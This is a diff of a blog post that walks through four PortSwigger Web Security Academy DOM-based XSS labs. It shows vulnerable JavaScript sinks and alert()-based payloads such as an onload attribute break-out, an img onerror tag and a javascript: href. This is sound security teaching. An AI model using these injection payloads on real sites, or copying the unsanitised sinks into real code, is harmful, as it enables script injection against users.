@@ -1,44 +1,48 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<!-- 2026-03-29 Sun 21:03 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>WSA: Apprentice DOM Based XSS</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="collection of solution to 4 dom based xss labs on Web Security Academy by PortSwigger" />
 <meta name="generator" content="Org Mode" />
-<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<script src="/src/copy-pre.min.js"></script><script src="/src/theme-switcher.min.js" defer></script><script src="/src/nav.min.js" defer></script><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><script src="/src/search.min.js" defer></script><link rel="stylesheet" href="/src/rougier.min.css" /><link rel="icon" type="image/x-icon" href="/src/favicon.ico"><script src="https://kit.fontawesome.com/78d5a086dd.js" crossorigin="anonymous"></script>
 </head>
 <body>
 <div id="preamble" class="status">
 <nav class="site-nav"> <div class="nav-header"> <a href="/" class="logo" aria-label="Home"> <span class="site-title">Chasing Simplicity</span> </a> <button id="menu-toggle" aria-label="Toggle menu"> <span class="hamburger"></span> </button> </div> <ul id="nav-menu"> <li><a href="/posts/recents.html" class="active">archive</a></li> <li><a href="/tags/index.html">tags</a></li> <li><a href="/posts/books.html">reading list</a></li> <li><a href="/posts/about.html">about</a></li> <li class="search-item"> <div id="search"></div> </li> <li class="theme-item"> <button id="theme-toggle" aria-label="Toggle theme">dark mode</button> </li> </ul> </nav>
 </div>
 <div id="content" class="content">
+<header>
 <h1 class="title">WSA: Apprentice DOM Based XSS</h1>
-<div id="table-of-contents" role="doc-toc">
+<nav class="post-tags">
+<span>Tags:</span> <a href="/tags/xss.html" class="tag">xss</a> <a href="/tags/wsa.html" class="tag">wsa</a>
+</nav></header><nav id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2acae2b">Introduction</a></li>
-<li><a href="#orgcaa9078">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
-<li><a href="#orgcf9f5ea">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<li><a href="#orge2123e0">Introduction</a></li>
+<li><a href="#org75377f1">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#org247fb47">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
 <ul>
-<li><a href="#org82f37e3">Why did not the first payload work?</a></li>
+<li><a href="#org16fc366">Why did not the first payload work?</a></li>
 </ul>
 </li>
-<li><a href="#org4af5cce">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
-<li><a href="#orgd0a9991">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
+<li><a href="#orga5612d8">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></li>
+<li><a href="#org6399db4">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a>
 <ul>
-<li><a href="#orgc094869">Update after: Intigrity explanaation video</a></li>
+<li><a href="#org4f788af">Update after: Intigrity explanaation video</a></li>
 </ul>
 </li>
-<li><a href="#org566757e">Summary</a></li>
+<li><a href="#org3a14f01">Summary</a></li>
 </ul>
 </div>
-</div>
-<div id="outline-container-org2acae2b" class="outline-2">
-<h2 id="org2acae2b"><a href="#org2acae2b">Introduction</a></h2>
-<div class="outline-text-2" id="text-org2acae2b">
+</nav>
+<div id="outline-container-orge2123e0" class="outline-2">
+<h2 id="orge2123e0"><a href="#orge2123e0">Introduction</a></h2>
+<div class="outline-text-2" id="text-orge2123e0">
 <p>
 If you have played around CTFs it is highly likely<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup> that you have
 encountered one of the common forms of cross-site scripting (XSS):
@@ -62,18 +66,18 @@ the page&rsquo;s contents based on a query.
 </p>
 
 <p>
-In the <a href="#orgcaa9078">first example</a>, taken from Web Security Academy by PortSwigger,
+In the <a href="#org75377f1">first example</a>, taken from Web Security Academy by PortSwigger,
 that query is a search field, but it could be a parameter, or &#x2026; a
 hashchange as shown in the last lab. Feel free to make any
 corrections/suggestions in the comment section.
 </p>
 </div>
 </div>
-<div id="outline-container-orgcaa9078" class="outline-2">
-<h2 id="orgcaa9078"><a href="#orgcaa9078">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-orgcaa9078">
+<div id="outline-container-org75377f1" class="outline-2">
+<h2 id="org75377f1"><a href="#org75377f1">In <code>document.write</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org75377f1">
 <div class="org-src-container">
-<pre class="src src-js" id="org05ae8b2"><span class="org-keyword">function</span> <span class="org-function-name">trackSearch</span>(<span class="org-variable-name">query</span>) {
+<pre class="src src-js" id="org97bb623"><span class="org-keyword">function</span> <span class="org-function-name">trackSearch</span>(<span class="org-variable-name">query</span>) {
     document.write(<span class="org-string">'&lt;img src="/resources/images/tracker.gif?searchTerms='</span>+query+<span class="org-string">'"&gt;'</span>);
 }
 <span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
@@ -83,21 +87,21 @@ corrections/suggestions in the comment section.
 </pre>
 </div>
 
-<pre class="example" id="org606ddd5">
+<pre class="example" id="org23bc290">
 " onload="alert()
 &lt;img src="/resources/images/tracker.gif?searchTerms=" onload="alert()"&gt;
 </pre>
 </div>
 </div>
-<div id="outline-container-orgcf9f5ea" class="outline-2">
-<h2 id="orgcf9f5ea"><a href="#orgcf9f5ea">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-orgcf9f5ea">
+<div id="outline-container-org247fb47" class="outline-2">
+<h2 id="org247fb47"><a href="#org247fb47">In <code>inner.html</code>&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org247fb47">
 <p>
 After navigating the site just a little bit we see that in the search
 page there is this embedded script snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-js" id="org7cd14af"><span class="org-keyword">function</span> <span class="org-function-name">doSearchQuery</span>(<span class="org-variable-name">query</span>) {
+<pre class="src src-js" id="orge9c460b"><span class="org-keyword">function</span> <span class="org-function-name">doSearchQuery</span>(<span class="org-variable-name">query</span>) {
     document.getElementById(<span class="org-string">'searchMessage'</span>).innerHTML = query;
 }
 <span class="org-keyword">var</span> <span class="org-variable-name">query</span> = (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'search'</span>);
@@ -113,7 +117,7 @@ with id <code>searchMessage</code>. Seeing the response more carefully:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-html" id="org1577b52">&lt;<span class="org-function-name">h1</span>&gt;&lt;<span class="org-function-name">span</span>&gt;0 search results for
+<pre class="src src-html" id="orga4fcea3">&lt;<span class="org-function-name">h1</span>&gt;&lt;<span class="org-function-name">span</span>&gt;0 search results for
 '&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span> <span class="org-variable-name">id</span>=<span class="org-string">"searchMessage"</span>&gt;&lt;/<span class="org-function-name">span</span>&gt;&lt;<span class="org-function-name">span</span>&gt;'&lt;/<span class="org-function-name">span</span>&gt;&lt;/<span class="org-function-name">h1</span>&gt;
 </pre>
 </div>
@@ -122,7 +126,7 @@ with id <code>searchMessage</code>. Seeing the response more carefully:
 Testing this payload should be more than enough
 </p>
 <div class="org-src-container">
-<pre class="src src-html" id="org47ef282">&lt;<span class="org-function-name">script</span>&gt;alert()&lt;/<span class="org-function-name">script</span>&gt;
+<pre class="src src-html" id="orgdae09d6">&lt;<span class="org-function-name">script</span>&gt;alert()&lt;/<span class="org-function-name">script</span>&gt;
 </pre>
 </div>
 
@@ -133,19 +137,19 @@ a <i>solved lab</i>.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-html" id="org1afdf0d">&lt;<span class="org-function-name">img</span> <span class="org-variable-name">src</span>=<span class="org-string">"fail"</span> <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;
+<pre class="src src-html" id="org55b0ca2">&lt;<span class="org-function-name">img</span> <span class="org-variable-name">src</span>=<span class="org-string">"fail"</span> <span class="org-variable-name">onerror</span>=<span class="org-string">"alert(1)"</span>&gt;
 </pre>
 </div>
 </div>
-<div id="outline-container-org82f37e3" class="outline-3">
-<h3 id="org82f37e3"><a href="#org82f37e3">Why did not the first payload work?</a></h3>
+<div id="outline-container-org16fc366" class="outline-3">
+<h3 id="org16fc366"><a href="#org16fc366">Why did not the first payload work?</a></h3>
 </div>
 </div>
-<div id="outline-container-org4af5cce" class="outline-2">
-<h2 id="org4af5cce"><a href="#org4af5cce">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-org4af5cce">
+<div id="outline-container-orga5612d8" class="outline-2">
+<h2 id="orga5612d8"><a href="#orga5612d8">In jQuery anchor href&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-orga5612d8">
 <div class="org-src-container">
-<pre class="src src-js" id="org100d3f8">$(<span class="org-keyword">function</span>() {
+<pre class="src src-js" id="org983cfe7">$(<span class="org-keyword">function</span>() {
     $(<span class="org-string">'#backLink'</span>).attr(<span class="org-string">"href"</span>, (<span class="org-keyword">new</span> <span class="org-type">URLSearchParams</span>(window.location.search)).get(<span class="org-string">'returnPath'</span>));
 });
 </pre>
@@ -157,7 +161,7 @@ The thing is that the function being used <code>attr()</code> seems to do a bett
 sanitization than what we have already seen, escaping ", and &rsquo;, not
 allowing with a plain payload to work
 </p>
-<pre class="example" id="orgd478325">
+<pre class="example" id="org8d86122">
 #does not work
 testaki'&gt; &lt;script&gt;alert()&lt;/script&gt;  
 #produced result
@@ -170,7 +174,7 @@ stackoverflow post for me), reminded me of a type of link I had
 forgotten: <code>javascript:</code>
 </p>
 
-<pre class="example" id="org23d0d2d">
+<pre class="example" id="orga1e41a5">
 javascript:alert(1);
 #produced result
 &lt;a id="backLink" href="javascript:alert(1);"&gt;Back&lt;/a&gt; 
@@ -182,10 +186,10 @@ successfully marks the lab as solved.
 </p>
 </div>
 </div>
-<div id="outline-container-orgd0a9991" class="outline-2">
-<h2 id="orgd0a9991"><a href="#orgd0a9991">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
-<div class="outline-text-2" id="text-orgd0a9991">
-<div class="note" id="orgdfe6569">
+<div id="outline-container-org6399db4" class="outline-2">
+<h2 id="org6399db4"><a href="#org6399db4">In jQuery selector sink using a hashchange event&#xa0;&#xa0;&#xa0;<span class="tag"><span class="lab">lab</span></span></a></h2>
+<div class="outline-text-2" id="text-org6399db4">
+<div class="note" id="org6569072">
 <p>
 First time on a room with a <code>Go to exploit server</code> button.
 </p>
@@ -196,7 +200,7 @@ First time on a room with a <code>Go to exploit server</code> button.
 In the website&rsquo;s home page there is this interesting js snippet:
 </p>
 <div class="org-src-container">
-<pre class="src src-js" id="org7fab192">$(window).on(<span class="org-string">'hashchange'</span>, <span class="org-keyword">function</span>(){
+<pre class="src src-js" id="org8c80136">$(window).on(<span class="org-string">'hashchange'</span>, <span class="org-keyword">function</span>(){
     <span class="org-keyword">var</span> <span class="org-variable-name">post</span> = $(<span class="org-string">'section.blog-list h2:contains('</span> + decodeURIComponent(window.location.hash.slice(1)) + <span class="org-string">')'</span>);
     <span class="org-keyword">if</span> (post) post.get(0).scrollIntoView();
 });
@@ -231,7 +235,7 @@ the end, effectively removing <code>#</code>.</li>
 Getting back to the lab: using links of the following form allows to
 find the post with that word, and move the screen to that.
 </p>
-<pre class="example" id="org44cc83d">
+<pre class="example" id="org590edac">
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Reverse
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Watching
 https://0aa700fb03d82670856aa9f50084000f.web-security-academy.net/#Speak
@@ -242,7 +246,7 @@ Now that we know what it does, how can we escape from it? My naive payload
 does not work, since <code>decodeURIComponent</code> obviously returns a string and
 does not just make a substitution.
 </p>
-<pre class="example" id="org7ac2f68">
+<pre class="example" id="org84391b7">
 # what I inserted
 /#')');alert(1); //
 # what I hoped for
@@ -268,13 +272,13 @@ website. I mean, as far as I can see it does not take advantage of
 page.
 </p>
 </div>
-<div id="outline-container-orgc094869" class="outline-3">
-<h3 id="orgc094869"><a href="#orgc094869">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
+<div id="outline-container-org4f788af" class="outline-3">
+<h3 id="org4f788af"><a href="#org4f788af">Update after: <a href="https://www.youtube.com/watch?v=JgiX3kyK8ME">Intigrity explanaation video</a></a></h3>
 </div>
 </div>
-<div id="outline-container-org566757e" class="outline-2">
-<h2 id="org566757e"><a href="#org566757e">Summary</a></h2>
-<div class="outline-text-2" id="text-org566757e">
+<div id="outline-container-org3a14f01" class="outline-2">
+<h2 id="org3a14f01"><a href="#org3a14f01">Summary</a></h2>
+<div class="outline-text-2" id="text-org3a14f01">
 <p>
 I think I&rsquo;m missing something so, that&rsquo;s enough labs for today, time
 for some research and theory. 
